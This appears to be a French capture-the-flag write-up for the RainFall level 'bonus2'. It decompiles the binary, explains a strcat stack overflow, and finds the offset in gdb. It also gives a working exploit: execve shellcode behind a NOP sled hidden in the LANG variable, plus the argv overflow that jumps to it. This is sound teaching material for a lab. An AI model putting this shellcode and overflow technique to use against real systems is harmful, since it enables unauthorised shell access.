# bonus2 : sled nop + overflow
    void greetuser(void)
    {
        char local_4c [4];
        undefined4 local_48;
        char local_44 [64];
        
        if (language == 1) {
            local_4c[0] = 'H';
            local_4c[1] = 'y';
            local_4c[2] = 'v';
            local_4c[3] = -0x3d;
            local_48._0_1_ = -0x5c;
            local_48._1_1_ = -0x3d;
            local_48._2_1_ = -0x5c;
            local_48._3_1_ = ' ';
            builtin_strncpy(local_44,"päivää ",0xb);
        }
        else if (language == 2) {
            builtin_strncpy(local_4c,"Goed",4);
            local_48._0_1_ = 'e';
            local_48._1_1_ = 'm';
            local_48._2_1_ = 'i';
            local_48._3_1_ = 'd';
            builtin_strncpy(local_44,"dag!",4);
            local_44[4] = ' ';
            local_44[5] = '\0';
        }
        else if (language == 0) {
            builtin_strncpy(local_4c,"Hell",4);
            local_48._0_1_ = 'o';
            local_48._1_1_ = ' ';
            local_48._2_1_ = '\0';
        }
        strcat(local_4c,&stack0x00000004);
        puts(local_4c);
        return;
    }

    undefined4 main(int param_1,int param_2)
    {
        undefined4 uVar1;
        int iVar2;
        char *pcVar3;
        undefined4 *puVar4;
        byte bVar5;
        char local_60 [40];
        char acStack_38 [36];
        char *local_14;
        
        bVar5 = 0;
        if (param_1 == 3) {
            pcVar3 = local_60;
            for (iVar2 = 0x13; iVar2 != 0; iVar2 = iVar2 + -1) {
            pcVar3[0] = '\0';
            pcVar3[1] = '\0';
            pcVar3[2] = '\0';
            pcVar3[3] = '\0';
            pcVar3 = pcVar3 + 4;
            }
            strncpy(local_60,*(char **)(param_2 + 4),0x28);
            strncpy(acStack_38,*(char **)(param_2 + 8),0x20);
            local_14 = getenv("LANG");
            if (local_14 != (char *)0x0) {
            iVar2 = memcmp(local_14,&DAT_0804873d,2);
            if (iVar2 == 0) {
                language = 1;
            }
            else {
                iVar2 = memcmp(local_14,&DAT_08048740,2);
                if (iVar2 == 0) {
                language = 2;
                }
            }
            }
            pcVar3 = local_60;
            puVar4 = (undefined4 *)&stack0xffffff50;
            for (iVar2 = 0x13; iVar2 != 0; iVar2 = iVar2 + -1) {
            *puVar4 = *(undefined4 *)pcVar3;
            pcVar3 = pcVar3 + ((uint)bVar5 * -2 + 1) * 4;
            puVar4 = puVar4 + (uint)bVar5 * -2 + 1;
            }
            uVar1 = greetuser();
        }
        else {
            uVar1 = 1;
        }
        return uVar1;
    }

en clair: 

    int language = 0;

    void greetuser(char *src) {
        char dest[72];
        
        switch (language) {
            case 1: 
                strcpy(dest, "Hyv\xc3\xa4\xc3\xa4 päivää "); 
                break;
            case 2: 
                strcpy(dest, "Goedemiddag! "); 
                // Mémoire (13 octets) : [ Goedemiddag! \0...]
                break;
            default: 
                strcpy(dest, "Hello "); 
                break;
        }
        
        strcat(dest, src);

        // Mémoire : [Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBB\x\x\x\x\0]
        // TOTAL : 13 octets (préfixe) + 63 octets (src) = 81
        // Le buffer 'dest' ne faisant que 72 octets, l'écriture déborde de 9 octets.

        puts(dest);
    }

    int main(int argc, char **argv) {
        char dest[76];
        
        if (argc != 3) {
            return 1;
        }
        
        memset(dest, 0, sizeof(dest));
        // Le tableau dest[76] est entièrement mis à zéros (\0).
        // Mémoire : [ \0\0\0... (76 octets) ]
        
        // Copie contrôlée des arguments (40 octets + 32 octets = 72 octets max)
        strncpy(dest, argv[1], 40);
        // Les 40 premiers octets d'argv[1] (40 A) sont copiés
        // Mémoire : [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA................................]

        strncpy(dest + 40, argv[2], 32);
        // Mémoire : [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBB\x\x\x\x\0\0\0\0\0]
        
        char *lang = getenv("LANG");
        if (lang != NULL) {
            if (memcmp(lang, "fi", 2) == 0) {
                language = 1;
            } else if (memcmp(lang, "nl", 2) == 0) {
                language = 2;
                // LANG commence par "nl", donc language passe à 2. 
                // Cela force "Goedemiddag! dans greetuser ".
            }
        }
        
        greetuser(dest);
        return 0;
    }


**setup la langue**

    export LANG=nl
    ./bonus2 1 1
    Goedemiddag! 1

**Trouver l'offset**

    (gdb) run aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaa aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaa
    Starting program: /home/user/bonus2/bonus2 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaa aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaa
    Goedemiddag! aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaaaaaabaaacaaadaaaeaaafaaagaaahaaa

    Program received signal SIGSEGV, Segmentation fault.
    0x61616761 in ?? ()


    61616761 = agaa = offset 23

**Trouver l'adresse de `LANG`**

    echo 'int main(){printf("%p\n",getenv("LANG"));}' | gcc -xc - -o /tmp/addr && /tmp/addr
    bonus2@RainFall:~$ echo 'int main(){printf("%p\n",getenv("LANG"));}' | gcc -xc - -o /tmp/addr && /tmp/addr
    <stdin>: In function ‘main’:
    <stdin>:1:12: warning: incompatible implicit declaration of built-in function ‘printf’ [enabled by default]
    <stdin>:1:1: warning: format ‘%p’ expects argument of type ‘void *’, but argument 2 has type ‘int’ [-Wformat]
    0xbfffff1d

**payload dans `LANG`**

`LANG` est une variable d'environnement donc elle est sur la stack, à une adresse qu'on peut retrouver, et son contenu est entièrement sous contrôle (le programme ne vérifie que les 2 premiers caractères `"nl"`). On y planque un NOP sled + shellcode juste après :

Le meme payload que tous les niveaux `execve("/bin//sh")` 

    export LANG=$(printf 'nl'; printf '\x90%.0s' {1..100}; printf '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80')


**redirection + overflow**

`argv[1]` = 40 octets de bourrage, `argv[2]` = 23 octets (offset) de bourrage jusqu'à l'adresse de retour + l'adresse de `LANG` (little-endian) :

    ./bonus2 $(printf 'A%.0s' {1..40}) $(printf 'B%.0s' {1..23}; printf '\x1d\xff\xff\xbf')

